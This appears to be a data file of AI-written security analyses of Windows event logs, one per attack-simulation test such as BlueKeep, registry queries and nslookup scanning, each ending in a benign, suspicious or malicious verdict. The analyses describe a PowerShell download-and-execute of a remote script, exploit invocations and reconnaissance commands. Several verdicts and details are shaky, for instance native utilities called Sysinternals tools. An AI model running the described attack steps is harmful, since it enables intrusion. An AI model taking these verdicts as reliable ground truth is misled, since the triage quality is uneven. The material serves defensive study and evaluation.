   - Events show executions related to system maintenance tasks such as `TiWorker.exe`, `svchost.exe`, `TrustedInstaller.exe`, and other Windows processes like `MicrosoftEdgeUpdate.exe` which appear consistent with normal system behavior.

Given these observations and considering the context of execution and targeted activities such as user enumeration, the logs contain signs of potentially malicious activity. 

### **Assessment and Resolution**

Resolution: **SUSPICIOUS**

### **Guidance on How to Proceed:**

- **Conduct a Thorough Investigation**: Follow up on the identified suspicious activities by conducting a system-wide search for the script mentioned and any resultant files created. Look into correlated systems and user accounts with a focus on `admin_test`.

- **Review User Activity**: Investigate logs for further evidence of who is executing these commands, especially reviewing abnormal working hours access or off-hours if applicable. Check for any new user accounts or privilege escalations.

- **Correlate External Threat Intelligence**: Compare against threat intelligence databases for known indicators relating to the PowerShell scripts and domains accessed.

- **Enhance Monitoring**: Increase log levels and introduce additional monitoring for Systems on this network focusing on PowerShell usage, especially identifying any new scripts and cmdlets used.

- **Run Security and Malware Scans**: Perform advanced endpoint detection and response (EDR) scans across systems for potential malware linked to these activities.
   
- **User Training or Audit Logs**: Consider auditing user actions to ensure compliance and understanding of responsible usage, potentially leading to enhanced user training if needed."
WinPwn - bluekeep,"After carefully analyzing the logs provided, several points of interest suggest potentially malicious activity. Here’s a breakdown of the suspicious behavior noted in the logs:

1. **Time Manipulation:**
   - The security log entries indicate two events (Event ID: 4616) where the system time is adjusted backward. This could potentially be an attempt to evade detection by altering timestamps to disrupt log correlation or to execute time-based attacks (e.g., replay attacks).

2. **Privileged Account Usage:**
   - Multiple log entries involve the `admin_test` user performing actions while possessing a comprehensive list of privileges, including `SeDebugPrivilege` and `SeImpersonatePrivilege` (Event ID: 4672 in security log). These elevated privileges can be exploited for malicious purposes, such as injecting code into other processes or impersonating other accounts.

3. **Suspicious PowerShell Execution:**
   - Sysmon logs (Event ID: 1) reveal the execution of PowerShell with a command line containing a download command from a potentially unverified external source: `https://raw.githubusercontent.com/script/script/.../script.ps1`. This behavior is often associated with malicious scripts attempting to download and execute further payloads, commonly seen in malware propagation.

4. **Network-Based Bruteforcible or RCE Activity:**
   - The PowerShell log entries echo the concern with the execution of potentially harmful content using a PowerShell script, referenced for execution via `bluekeep -noninteractive -consoleoutput`, a parameter related to exploiting BlueKeep, a vulnerability in Remote Desktop Services.

5. **Frequent Process Creation and Execution with Elevated Privileges:**
   - Numerous processes related to `MicrosoftEdgeUpdate.exe` and `conhost.exe` appear frequently and run with elevated privileges. While legitimate updates can create similar logs, given the suspicious PowerShell activity, this might be used to disguise the execution of malicious code.

Based on the collected data and observed behavior, the situation presents multiple red flags typically associated with a compromised machine. Specifically, the observed PowerShell execution with external script download, time manipulation, and the privileged account usage for potential malicious activities, lead to identifying the situation as follows:

**Final Assessment: MALICIOUS**

**Guidance on How to Proceed:**
1. Immediately isolate the affected machine (Server002) from the network to contain potential threats.
2. Conduct a thorough forensic investigation focused on identifying any malicious payloads downloaded and executed by the PowerShell script.
3. Analyze and audit the actions performed by the `admin_test` user to discover any unauthorized changes or further compromises.
4. Review and update the network and system security policies to prevent similar occurrences, including restricting direct internet PowerShell downloads and applying security patches to mitigate vulnerabilities like BlueKeep.
5. Consider resetting access credentials, particularly for administrative accounts, and enforce stricter multi-factor authentication protocols."
Process Discovery - tasklist,"Upon analyzing the provided event logs from the Windows host, here is the summarized assessment and investigative findings:

### Analysis of Logs

1. **Time General Events (System Log & Security Log)**
   - **EventID 24 & 1 (System):** These logs indicate system time adjustments. The `svchost.exe` process changed the system time backward from ""2024-10-22 19:11:37.0803302"" to ""2024-10-22 19:11:08.3381831"". Such actions are usually legitimate but can potentially be leveraged by malicious actors to erase traces of their activity.
   - **EventID 4616 (Security):** Corresponds with the System log entries about time changes. The `LOCAL SERVICE` user, with the process `svchost.exe`, made time changes.

2. **Process Execution (Sysmon Log)**
   - **Common Utility Executions:** There are multiple executions of benign Windows utilities such as `whoami.exe`, `cmd.exe`/`tasklist`, and `hostname.exe` by the user `SERVER002\admin_test`. These tools can be used for system reconnaissance or administrative tasks.
   - **Frequent `conhost.exe` Processes:** `conhost.exe` is launched alongside executed commands, which is typical behavior when executing terminal-based commands.
   - **`wevtutil.exe` Processes:** This tool is used to manage event logs and could be suspicious if it’s used to clear logs or in atypical contexts.
   - **Service Updates:** `MicrosoftEdgeUpdate.exe` is seen executing, which is typical behavior regarding automatic updates or scheduled tasks.

3. **Other System Processes:**
   - `svchost.exe` and `sppsvc.exe` are legitimate system processes with no evident malicious indicators given their typical behaviors and contexts in the logs.
   - `TiWorker.exe` and `TrustedInstaller.exe` are parts of system maintenance and update management tasks.

4. **Event Log Timestamps & Frequency:**
   - There's a high frequency of events over a short period. However, these appear to be administrative commands and scheduled updates rather than suspicious activities.

### Assessment

Based on the provided logs, the activities that stand out mainly include basic Windows administrative tasks, time adjustments, and query executions about system status. While certain tools like `cmd.exe` and `tasklist` could be used for reconnaissance, there are no strong indicators or evidence of malicious behavior such as privilege escalation, suspicious remote connections, or unauthorized access.

### Conclusion

Given the absence of any overtly harmful actions and the consistency of the logged activities with potential administrative oversight or system maintenance tasks, the overall assessment of these logs aligns with benign activity:

**Resolution: BENIGN**

### Guidance on How to Proceed

- **Monitoring:** Continue to monitor the system for unexpected behavior or abnormal usage of administrative tools.
- **Alerting on Time Changes:** Establish alerts for time changes or irregular log clearing activity that might indicate tampering.
- **User Activity Review:** Periodically review user activities, especially the use of administrative tools to ensure they match expected patterns or tasks.
- **Regular Security Audits:** Conduct regular audits and ensure the implementation of security best practices to preemptively mitigate potential risks."
Applications Installed,"Analyzing the various logs from the given Windows host provides several insights into activities that occurred on the system:

### System Log Analysis
The system log captures typical system events, including time changes:

- **Event ID 24 and 1 from Kernel-General**: Indicate system time changes. These events are logged when the system time is changed, either manually or automatically synced (e.g., with an NTP server). The change here aligns with the Windows Time Service selection of `time.windows.com` as the TimeSource. This kind of regular time sync is usually benign unless root cause of a potential compromise (e.g., time manipulation to hide tracks).

### Windows PowerShell Log Analysis
PowerShell logs detail the execution of a script or command:

- **Event ID 600**: Shows a command executed using PowerShell to list installed software from the registry. The command is designed to extract information about DisplayName, DisplayVersion, Publisher, and InstallDate from the registry – commonly used for software inventory checks. The command doesn't appear inherently malicious, as it uses `Get-ItemProperty` for legitimate reasons, often part of system audits or inventories.

### Security Log Analysis
Security logs capture events related to security auditing:

- **Event ID 4616 from Security-Auditing**: Indicates system time was changed, executed under the `svchost.exe` process on behalf of `LOCAL SERVICE`. It corresponds with other logs in the System channel, showing usual system time adjustments.

### Sysmon Log Analysis
Sysmon logs are crucial in monitoring process creations and file operations:

- **Event ID 1 (Process Creation)** and **Event ID 5 (File creation)**: Multiple instances of typical Windows processes (e.g., `HOSTNAME.EXE`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`) being executed by the user `admin_test`. The context and parent process information appear legitimate, as the listed processes and their parent of `wsmprovhost.exe` and command lines don’t indicate malicious behavior. These processes include Sysmon Event IDs associated with common administrative tasks.

### Summary and Resolution
Based on the log files, there are no clear indicators of compromise or malicious activity. Most activities are associated with normal administration or system maintenance activities. The PowerShell command executed is a common software inventory technique, and the Sysmon logs reflect activities consistent with user-driven or scheduled tasks.

Resolution:
- **BENIGN** - The logged activity does not show signs of malicious activity. All processes and actions align with legitimate system and administrative functions.

### Guidance
Though the logs are benign, it's essential to maintain vigilance through continuous monitoring for any anomaly, especially around privileged process executions or changes in command-line behavior. Regular updates to the threat intelligence and logging configurations ensure improved detection of any potential future threats."
Enumerate Active Directory Computers with Get-AdComputer,"After thoroughly analyzing the provided Windows event logs from the machine ""Server002,"" the following observations are made:

### Summary:
- **Application Logs** highlight Windows Defender activity, stating that it is turned on, which is a standard security measure ensuring antivirus protection is active.
  
- **System Logs** indicate routine Windows updates, specifically Security Intelligence Updates for Microsoft Defender Antivirus. This includes updates with revision number 200 being applied, which is normal for keeping security definitions current.

- **Sysmon Logs** show multiple instances of process creation and execution, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. These actions are executed by the user `SERVER002\admin_test` with high integrity levels.
  - **`wevtutil.exe` and `conhost.exe`** are executed multiple times, likely as a part of normal administrative tasks or system operations. These processes typically handle Windows Event Log management and command console hosting, respectively.
  - **`powershell.exe`** instance executing a script with a filter is observed, appearing somewhat generic without specificity on what the script entails. PowerShell can be used for legitimate administrative tasks but can also be exploited for malicious purposes.

- **Security Logs** reflect credential read operations (`Event ID 5379`) that return a specific error code but do not indicate a successful credential retrieval or suspicious privilege escalation.

- **Windows PowerShell Logs** show the initialization and stopping of PowerShell engine states. The command filter was not explicit, which could mask underlying actions. However, the brevity of the PowerShell session might suggest a typical short session rather than prolonged activity often associated with illicit actions.

### Assessment:
- **Routine Updates and Antivirus Checks**: Application and System logs indicate typical updating processes which are benign and recommended for system security.
  
- **Frequent Execution of System Utilities**: Sysmon events involving `wevtutil.exe`, `conhost.exe`, and common utilities (`hostname.exe`, `whoami.exe`) do not inherently indicate compromise but are actions an administrator or system process might perform.

- **PowerShell Execution**: Although PowerShell can be potent in system management and attacks, the generic nature of the script (-Filter *) and lack of further detailed context render this inconclusive for immediate threat designation.

- **Security Events**: Failed credential operations are not rare and alone didn’t demonstrate further attempts of unauthorized access or compromise.

### Conclusion:
Based on the logs provided, there is no definitive evidence of malicious behavior or compromise. However, due to the brief PowerShell activity, while likely benign, lacks context hence cannot be fully dismissed as entirely ordinary without supplementary information for the command run.

**Resolution: SUSPICIOUS**

### Guidance on Proceeding:
- **Further Investigate PowerShell Activity**: Review scripts executed or intended by `powershell.exe` on this host and ensure they align with legitimate administrative tasks.
- **Monitor Future Activity**: Keep a close watch on the `SERVER002\admin_test` account activities for potential misuse.
- **Engage with User**: If possible, confirm with the user `admin_test` regarding the administrative actions and intended PowerShell usage.

Overall, while the logs lean towards routine administrative activities, extra scrutiny into the PowerShell session and account activity will ensure no stones are left unturned, securing potential oversight."
Network Share Discovery command prompt,"Based on the given Windows event logs, here is the detailed analysis:

### Application Log
- The log shows multiple instances of the `edgeupdate` service stopping, which is not inherently suspicious but noteworthy if paired with other unusual activities.

### Sysmon Log
- Observations:
  - Numerous executions of legitimate system utilities such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`. These activities are often normal but can indicate suspicion if linked to a user account possibly conducting reconnaissance or lateral movement.
  - Usage of command lines such as `""cmd.exe"" /c net view \\localhost` indicates possible network reconnaissance activity.
  - Frequent execution of `MicrosoftEdgeUpdate.exe` with different command-line arguments, suggesting legitimate software update activity, although such activity could potentially be manipulated by threats like malware acting under the guise of legitimate updates.

### System Log
- Contains time-related entries including time adjustments, which is typically managed by system services and usually benign unless being altered deliberately for malicious purposes.

### Windows PowerShell Log
- No relevant events present.

### Security Log
- Event ID 4672 indicates that the account `admin_test` was granted special privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This could indicate potential privilege escalation or misuse, especially if not typical for the user.
- Event ID 4624 logon event with NTLM authentication indicates potential lateral movement or exploration activity.
- Multiple Event ID 4616 with time adjustments, usually not suspicious alone but could be relevant if paired with other manipulative actions.

### Findings
1. **Recon Activity**: The execution of commands like `net view` from `cmd.exe` suggests privilege recon or network exploration.
2. **Privilege Indicators**: The user account `admin_test` receiving elevated privileges and performing numerous actions could denote unusual behavior warranting investigation.
3. **Legitimate but Abused Processes**: Heavy usage of `MicrosoftEdgeUpdate.exe`, albeit typical for updates, requires vigilance to ensure it isn’t spawning unauthorized processes or behaviors.

### Recommendation
Given these observations, the activity documented in the logs fits under the resolution of:

- **SUSPICIOUS** - There are activities such as network reconnaissance commands and privilege escalations that warrant further investigation to rule out potential malicious activity or abuse by insiders using legitimate tools for unauthorized purposes.

### Guidance for Further Action
1. **Conduct a Deep Dive Investigation** on the user `admin_test` to verify the legitimacy of their actions, particularly around the time of the suspicious event occurrences.
2. **Review Network Traffic Logs** for any unauthorized or anomalous connections or transferred data, particularly emanating from the observed IP `192.168.0.102`.
3. **Audit Privileges and Access Logs** to ensure permissions consistent with roles and no over-provisioning, especially given the special privileges granted to `admin_test`.
4. **Verify the Integrity** of `MicrosoftEdgeUpdate.exe` executions and ensure no tampering or unauthorized execution pathways exist, such as in `C:\Program Files (x86)\Microsoft\Temp\`.

These steps can help clarify whether the suspicious behavior indicates a compromise or if it is part of legitimate administrative maintenance."
System Information Discovery (2),"Upon reviewing the provided Windows event logs, several patterns in process execution and command-line activity have been observed. A comprehensive analysis of the event logs has revealed the following points:

1. **Process Execution and Command-Line Arguments**:
    - Frequent execution of `cmd.exe`, `wevtutil.exe`, `wscript.exe`, `reg.exe`, and `Sc.exe` with complex command-line arguments. This includes operations such as exporting registry keys, executing scripts, and gathering system and network configuration information.
    - The execution of `wscript.exe` with a script `gatherNetworkInfo.vbs` is suspicious as it involves environment reconnaissance.

2. **PowerShell Activity**:
    - A PowerShell command was invoked to gather extensive network configuration information and output it to a file. This includes network adapters, DNS policies, routes, IP addresses, services, and more. Such activity can be indicative of an attempt to collect detailed system and network information possibly for further exploitation.

3. **Integrity Levels and User Context**:
    - The processes are executed with high integrity levels, suggesting escalated privileges. All executions related to suspicious tasks are conducted under the `SERVER002\admin_test` account, indicating the presence of elevated user permissions.

4. **Log Anomalies**:
    - Time discrepancies were observed in the system logs where the system time was abruptly adjusted backward by a few seconds. Such behavior is often used to manipulate timestamps in log files to cover tracks.
    - Security logs show signs of various login types and privileged operations, which coincide with the timeline of the command executions.

5. **Security Audit Logs**:
    - There are several entries related to the access and operations on sensitive files and processes, particularly associated with the `admin_test` account. This indicates potential unauthorized administrative actions which, when combined with the observed behaviors, reinforce the suspicion of malicious activity.

**Assessment and Conclusion**:
The logs indicate a sequence of actions emblematic of an adversary conducting reconnaissance within the environment. This includes gathering intricate details about network interfaces, connectivity status, group policies, and more, combined with the use of scripting for data gathering and registry manipulation.

Therefore, based on the extensive collection of system and network information, use of administrative scripts, and unusual adjustments of system time, the overall activity is rated as **MALICIOUS**. This suggests a likely breach or compromise.

**Guidance on How to Proceed**:
1. Immediately isolate the affected host from the network to prevent any further malicious activities.
2. Conduct a thorough forensic investigation to identify any additional compromises or persistence mechanisms established by the adversary.
3. Review user account activities, especially focusing on `admin_test`, and consider resetting credentials.
4. Implement stricter access controls and monitoring for sensitive operations, such as the execution of PowerShell scripts and changes to system settings.
5. Provide user training to recognize suspicious activity and encourage immediate reporting."
WinPwn - Dotnetsearch,"After thoroughly analyzing the provided event logs, here is a detailed assessment of the situation:

### Application Log:
The application log entries mostly pertain to routine events for various services.
- **EventID 15 - Security Center**: Indicates that Windows Defender is active, which is a benign and expected activity.
- **EventID 0 - edgeupdate**: Logs indicate that the Edge Update service stopped at certain timestamps. This is likely a routine operation during update processes or system maintenance.

### System Log:
System logs primarily capture time synchronization and other kernel activities.
- **EventID 24 - Kernel-General and Time Service**: Events show typical system time adjustments, which are routine and do not indicate any anomaly.

### Security Log:
- **EventID 4616 - Security Auditing**: Logs reflect time changes initiated by the Local Service, which align with kernel activities in the system log. This also appears normal.

### Windows PowerShell Log:
Suspicious activity is noted in the PowerShell logs:
- **EventID 600 - PowerShell**: PowerShell is seen executing a script downloaded from a potentially malicious source (https://raw.githubusercontent.com/script). This activity is highly suspicious due to the external script execution and could be indicative of a compromise if the script was unintended.

### Sysmon Log:
- The Sysmon events capture multiple Edge Update executions and processes, which is typical for update services. However, alongside these, execution of the PowerShell script stands out as potentially malicious.
- **EventID 1 for PowerShell**: Confirms the execution of PowerShell with a script downloaded from an external URL, suggesting possible unauthorized activity.

### Assessment:
1. **Anomalous PowerShell Activity**: The execution of a PowerShell command downloading and executing a script from an external URL is a strong indicator of a malicious attempt or compromise. This is not typical behavior for a trusted system or application-based scripting and warrants deeper investigation.

2. **Routine Edge Updates and Time Adjustments**: The Edge updates and time adjustments across logs are routine for system maintenance and do not indicate malicious activity by themselves.

### Resolution:
Based on the abnormal PowerShell activity involving external script execution, the overall assessment of the logs leads to classifying the activity as **MALICIOUS**. 

### Guidance on How to Proceed:
- **Immediate Containment**: Discontinue network access for the affected machine (Server002) to prevent any potential spread or external communication by the malicious script.
- **In-depth Analysis**: Retrieve and analyze the downloaded script meticulously to understand its actions and impact on the system.
- **Review Access Logs**: Investigate user accounts and any potential unauthorized access linked with the server.
- **Scan and Remediate**: Run a comprehensive malware scan on the system and apply patches or reinstalls if necessary to ensure the system’s integrity.
- **Implement Monitoring and Alerts**: Establish heightened monitoring and alerts for unusual PowerShell activities and external connections to prevent future incidents.

By taking these measures, the organization can effectively manage the current threat and improve its security posture against similar attacks in the future."
Display group policy information via gpresult,"**Log Analysis:**

After examining the provided logs from various sources (Application, Security, Sysmon, System logs), let's identify events that may indicate suspicious or malicious activity:

1. **Time Change Events:**
   - Security and System logs show multiple instances of event ID 4616, where `svchost.exe` adjusted system time. Event ID 4616 logs indicate a system time change, which can be an indicator of malicious activity like timestomping. It appears the time changed from `2024-10-28 16:32:11.92` to `2024-10-28 16:32:03.76`. Such activities could be attempted to mask the timeline of events or modify time stamps related to malicious activity.

2. **Use of Execution Utilities:**
   - The Sysmon log reflects the usage of `whoami.exe`, `cmd.exe`, `wevtutil.exe`, and other processes. While the use of these tools could be legitimate for administrative purposes, their usage can also be associated with reconnaissance and other activities by an attacker.

3. **Execution of Edge Update Programs:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` are logged in the Sysmon events, with varied command line arguments like `/update`, `/regsvc`, `/svc`, etc. While these executions may seem routine for browser updates, the volume and frequency within a short period might require further examination to rule out misuse.

4. **Privilege Process Executions:**
   - Processes such as `WmiPrvSE.exe` and `Service SPP` running under elevated privileges like `NT AUTHORITY\SYSTEM` are common, but it's always good practice to verify associated activities to ensure they align with expected behaviors.

5. **Integrity Level:**
   - Many processes are executed with a ""High"" integrity level, which suggests administrative privileges. This is expected for system-level processes but still worth checking if they originate from an unusual parent process.

**Resolution:**

Given the context of the events, especially related to the time changes and the execution of system utilities, we summarize the situation as:

- **SUSPICIOUS:** The logs contain activities, particularly the alteration of system time and the execution patterns of processes, which do not immediately appear malicious but are abnormal enough to warrant further investigation.

**Guidance on How to Proceed:**

1. **Investigate Time Changes:** Determine if the time change activities surrounding `svchost.exe` align with legitimate administrative maintenance tasks or if they are a red flag of malicious intent.
   
2. **Review User Actions and Privileges:** Verify recent user activity logs and administrative actions, focusing on users who have executed these utilities to identify if any processes were unauthorized or unusual.

3. **Check System Integrity and Conduct Malware Scans:** Assess the integrity of key system files and perform comprehensive anti-malware scans to ensure no threats persist within the environment.

4. **Monitor and Log Further Activities:** Increase logging and monitoring of the system for further suspicious activity from these or new processes. 

By conducting these checks, you can validate if the behavior observed is consistent with an attack or part of normal server operations."
Query Registry,"Upon reviewing the provided log entries, the following activities and analysis can be identified:

### Suspicious Activity

1. **Frequent Use of ""reg.exe"" with Command-Line Arguments:**
   - Throughout the logs, there is a significant number of command-line registry queries performed using `reg.exe`. These queries target various autorun registry keys, services, and shell-related settings.
   - Such extensive enumeration of registry keys within a short timespan could indicate an attempt to identify persistence mechanisms or configuration changes within the system.
   - Example commands include queries to:
     - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\RunServicesOnce`
     - `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`
     - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
   - These activities are executed under the ""SERVER002\admin_test"" user account, which likely has administrative privileges based on the `High` integrity level and consistent use of `cmd.exe`.

2. **Frequent Use of ""findstr.exe"":**
   - The presence of commands using `findstr.exe` in conjunction with `reg.exe` indicates an attempt to filter and retrieve specific information from command outputs, a typical behavior of scripts or automated tools.

3. **Frequent Use of ""cmd.exe"" with Complex Queries:**
   - The logs show complex command-line arguments being used with `cmd.exe`, which involve multiple chained registry queries. This resembles behavior commonly used in scripts, possibly for reconnaissance or system audit activities.
   - The parent process of these activities is `wsmprovhost.exe`, suggesting these could be script-based operations originating from remote management or automation tasks.

4. **Miscellaneous Sysmon Events:**
   - The execution of processes like `wevtutil.exe`, `conhost.exe`, and host enumeration commands like `whoami.exe` under the same user suggests possible reconnaissance being performed, or potentially benign administrative tasks. However, when coupled with the other observations, it increases the suspicious nature.

### Non-Suspicious Activity

- **The Update and Installation Operations:**
  - Logs indicate the update and installation processes for Microsoft Edge, Microsoft Defender Antivirus, and Windows Updates, performed as system-level tasks by legitimate Microsoft software components.
  - These processes include `MicrosoftEdge_X64.exe`, `wuauclt.exe` (Windows Update), `MpSigStub.exe` (Microsoft Signature Update Stub), and are executed by `NT AUTHORITY\SYSTEM` which are typically expected behaviors.

### Security Logs and System Logs Analysis

- **Security Logs:**
  - Multiple Event ID 5379 originating from the ""SERVER002"" machine show credential operations associated with MicrosoftAccount, likely tied to background maintenance tasks or Microsoft services.
  - Return codes and failed attempts might warrant further review, but do not by themselves indicate immediate malicious intent.

- **System and Application Logs:**
  - Reflect normal system operations such as update checks and conversions possibly related to Security-Driven Platform Protection (SPP).

### Assessment and Guidance

**Resolution: SUSPICIOUS**

- The preponderance of registry queries and the pattern of behavior observed are suspicious and warrant further investigation. While individually some commands might be explained away by admin tasks or scripts, the volume and variability of these queries within such a short timeframe should be considered unusual.
- **Recommended Actions:**
  - Investigate the context of the ""admin_test"" user's activities. Verify if these tasks align with legitimate administrative functions or expected automated scripts.
  - Review for any unauthorized scripts or tools installed on the host that could have triggered these events.
  - Conduct a deeper audit of other relevant logs and historical data to determine if similar activities occurred previously.
  - Monitor network traffic logs and other hosts for correlated malicious activities or data exfiltration attempts.
  - If not part of an authorized test or known legitimate operations, consider isolating the host and conducting a thorough security scan."
Environment variables discovery on windows,"**Analysis of Windows Event Logs:**

**1. PowerShell Logs:**
- No entries provided for PowerShell logs. This absence may indicate minimal direct PowerShell activity, but it does not confirm the absence of suspicious or malicious behavior as some activities might not be logged.

**2. System Events:**
- **Event ID 24 and 1 from Kernel-General:** These events show time adjustments by the system. However, the adjustment (rollback) from “2024-10-23 17:38:47” to “2024-10-23 17:38:43” seems unusual. Repeated system time changes, especially small rollbacks, can be indicative of tampering to evade detection by altering timestamps of activities.
  
**3. Application Events:**
- **Event ID 16384 from Security-SPP:** This indicates regular operation of the Software Protection Platform, a standard service for managing licensing.

**4. Security Events:**
- **Event ID 4624 & 4672:** Successful logon by user “admin_test”, with high privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, etc. While this might be normal for an administrative user, such privileges could potentially be leveraged for malicious purposes.
- **Event ID 4634:** Logoff events, showing the admin user “admin_test” logging off, which is typical for user activity.

**5. Sysmon Logs:**
- Several processes, including `wevtutil.exe`, `cmd.exe`, and `whoami.exe` executed by admin_test, are evident. These are standard utilities, but their execution could suggest enumeration or configuration changes:
  - Execution of `wevtutil.exe` and `cmd.exe` could be related to querying or modifying event logs and system configurations.
  - Use of `whoami.exe` is often used for user context verification.
  - `conhost.exe` instances indicate usage of console applications likely for command execution.
- Use of legitimate tools such as `wevtutil` and `cmd` as seen here, is often associated with ""Living off the Land"" tactics, where attackers use native system tools to evade detection.

**Assessment of Situation:**
- **Suspicious Time Changes:** Multiple instances of time rollback merit further investigation, as they do not generally follow normal system behavior unless related to synchronization issues, which should be verified.
  
- **High-Privilege User Actions:** The activities by a high-privilege user “admin_test” are worth further scrutiny to ensure these actions are legitimate administrative tasks rather than unauthorized access.

- **Usage of Sysinternals Tools:** Although these tools are native to Windows, their use could indicate potential misuse if not corresponding to expected administrative tasks.

**Resolution: SUSPICIOUS**

While no outright malicious actions have been conclusively identified, the combination of time rollback events, high-privileged actions, and use of sensitive native utilities may suggest misuse or preparation stages of malicious activity. Continued monitoring and correlation with other data sources, such as network logs and user activity reports, are recommended for a comprehensive investigation. Steps to verify the identity and purpose of the user “admin_test” during this timeframe should also be prioritized."
Enumerate Root Domain linked policies Discovery,"In analyzing the provided Windows event logs, the objective is to identify any indicators of potentially malicious activity. Below is a detailed assessment of the logs:

### Security Log:
1. **Event ID 4616 (System Time Change)**:
   - Occurrences: Two events where the system time has been changed by the process `svchost.exe`.
   - Analysis: System time changes can indicate malicious activity, especially if done repeatedly or without clear justification. However, changes executed by `svchost.exe` can be a normal part of system time synchronization tasks, such as updates from an NTP server.

### Windows PowerShell Log:
1. **Event ID 600 (Provider State Change)**: 
   - A PowerShell process was started with a command that includes accessing the ADSI (Active Directory Service Interfaces). This can be used for querying Active Directory information.
   - Analysis: The command involves querying Group Policy links and may extract information about policy paths and names. While this can be a part of legitimate administrative scripts, it may also be indicative of reconnaissance activities by a malicious actor trying to map the environment.

### Application Log:
1. **Software Protection and Edge Update Events**:
   - Regular updates and service stop events for Microsoft Edge and the Software Protection Platform.
   - Analysis: These activities appear routine as part of normal system and application maintenance processes.

### Sysmon Log:
1. **Process Creation Events (Event ID 1 and 5)**:
   - Multiple instances of `wevtutil.exe`, `svchost.exe`, `whoami.exe`, and Microsoft Edge Update processes.
   - The use of `wevtutil.exe` by the user `SERVER002\admin_test` might be to query event logs, which by itself isn't suspicious if done by a legitimate admin. 
   - The script executed by PowerShell that queries ADSI for Group Policy links is captured, matching the PowerShell log analysis.
   - Microsoft Edge Update processes run under `NT AUTHORITY\SYSTEM`, which is typical for application updates.
  
### System Log:
1. **Kernel-General Events (Event ID 1 and 24)**:
   - System time changes associated with time synchronization services.
   - Analysis: Similar to the security log, these time changes seem to be triggered by the `svchost.exe` process, indicating routine time synchronization.

### Conclusion:
- **Suspicious Activity**: The PowerShell command executed involves querying sensitive system information, a common tactic for malicious reconnaissance, and therefore qualifies as suspicious.
- **Regular System Operations**: Other logged activities like time synchronization, Edge updates, and service starts seem to be normal system operations and software updates.

### Guidance:
- Conduct further investigation on the PowerShell script: Determine the origin and context of the script execution, identify who initiated it, and verify whether it is part of authorized administrative tasks.
- Review access control policies and ensure monitoring of scripts that access directory services or are capable of system modifications.

### Final Resolution: **SUSPICIOUS** - Further investigation warranted for PowerShell activity."
Enumerate Linked Policies In ADSISearcher Discovery,"**Detailed Analysis of Log Entries:**

1. **Security Log Analysis:**
   - The Windows Security logs mainly show EventID 4616, which indicates system time changes. These are associated with the ""LOCAL SERVICE"" account and utilize ""C:\Windows\System32\svchost.exe"". The time change events do not inherently indicate malicious activity but could be suspicious if they are used to conceal actions or if unauthorized alterations to system time are happening without legitimate reason.

2. **Sysmon Log Analysis:**
   - The Sysmon logs show several instances of process creation (EventID 1) and process termination (EventID 5) events by ""SERVER002\admin_test"" using ""C:\Windows\System32\wevtutil.exe"" and ""C:\Windows\System32\conhost.exe"". These appear to be normal processes usually associated with event log management and console hosts respectively.
   - A notable entry is the execution of ""powershell.exe"" with a detailed and complex command line, indicating a script is being executed. The script seeks to enumerate organizational unit paths which could suggest recon activity. PowerShell is a common utility in both administrative and adversarial activities.

3. **Windows PowerShell Log Analysis:**
   - Reflects the execution of the PowerShell script detailed earlier in Sysmon logs, confirming user ""SERVER002\admin_test"" executed this script.

4. **System Log Analysis:**
   - Showcases system time changes, corroborating with security log events. The changes use ntp.m|0x9 (time.windows.com) as a time source, which is a legitimate Microsoft time server. This does not directly indicate malicious activity.

5. **Application Log Analysis:**
   - Contains entries related to Edge updates which appear routine and complete normally. No anomalies are detected in these which indicate malicious intent.

**Assessment of the Situation:**
- While many operations such as processes by ""MicrosoftEdgeUpdate.exe"" and services related to it appear routine and expected, the execution of a complex PowerShell script bear an investigation, especially if not pre-approved as part of regular administrative tasks. The PowerShell command seems to query Active Directory Organizational Units, which could be part of legitimate administrative or monitoring activity but might also suggest reconnaissance if no such approved usage is validated.

**Resolution:**
- **SUSPICIOUS:** The logs display a PowerShell script execution which could suggest reconnaissance or administrative activity. Although there is no direct indication of compromise (such as payload execution or privilege escalation), the nature of the PowerShell commands being run is unusual and should be further examined to ensure they align with user roles and permission levels. 

**Guidance on How to Proceed:**
- Verify if the PowerShell scripts were authorized as part of regular administrative tasks.
- Check with user ""SERVER002\admin_test"" or their management to confirm the legitimacy of this activity.
- Monitor for any further suspicious scripting activity or privilege escalation attempts.
- If unauthorized, consider performing further forensic analysis on ""SERVER002"" and possibly alerting incident response if additional anomalies are discovered."
Remote System Discovery - nslookup,"Upon analysis of the provided log entries across various channels, we observe the following:

1. **Windows Update Activity**: 
   - The System logs indicate the normal operation of Windows updates. Security intelligence updates for Microsoft Defender Antivirus are recorded, which is standard behavior for maintaining system security and does not by itself suggest any compromise.

2. **Sysmon Activity**:
   - Several executions related to benign system commands (`whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`) are observed. However, the frequent execution of `wevtutil.exe` might warrant further investigation if unauthorized attempts to manipulate or query the event logs are suspected.
   - Notably, a sequence of `powershell.exe` executing a script involving `ipconfig`, `cmd.exe`, and `nslookup` was found. This indicates a script is executing ip range scanning using PowerShell, which is considered suspicious behavior, particularly if it occurs outside of expected administrative tasks.

3. **Security Event Logs**: 
   - Several logon and privilege-grant events are captured. The presence of EventID 4672 indicating high privilege assignments suggests administrative tasks. 
   - The NTLM logon type (found in EventID 4624) from an IP address is expected in environments where Network Logins are performed. However, consistent logging of such events should be cross-verified to rule out any misuse.

4. **Windows PowerShell Logs**:
   - The command seen here corresponds to a script executing IP scanning as discussed under Sysmon logs. PowerShell is used to dynamically generate IPs for reconnaissance purposes, which aligns with tactics used in network scanning operations.

5. **Application and Other Logs**:
   - Windows Defender is reported as active and no additional triggers related to critical security warnings or AV alerts were found in these logs.
   - Legitimate software updating processes are visible related to Microsoft Edge, providing no suspicious indicators.

**Conclusion**: The PowerShell activity specifically engaging in IP address scanning using network utilities (`ipconfig` and `nslookup`) is atypical and could signify reconnaissance scouting, typical of a cyber threat actor probing the network for vulnerable nodes. Such behavior, especially when not initiated by known administrative scripts or personnel regularly, should trigger a deeper investigation.

